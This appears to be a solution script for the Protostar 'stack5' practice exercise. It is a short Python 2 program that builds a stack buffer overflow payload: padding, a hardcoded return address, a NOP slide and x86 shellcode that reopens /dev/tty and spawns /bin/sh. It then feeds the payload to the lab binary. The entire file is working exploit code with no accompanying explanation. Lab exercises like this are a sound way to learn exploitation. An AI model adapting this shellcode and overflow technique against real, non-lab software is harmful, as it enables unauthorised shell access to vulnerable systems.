#!/usr/bin/env python2.6

import struct
import utils

padding = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSS"
jump_addr = struct.pack("I", 0xbffff6c0)
shellcode = "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
nopslide = "\x90" * 20
payload = padding + jump_addr + nopslide +  shellcode

utils.run_file_with_stdin("/opt/protostar/bin/stack5", payload)
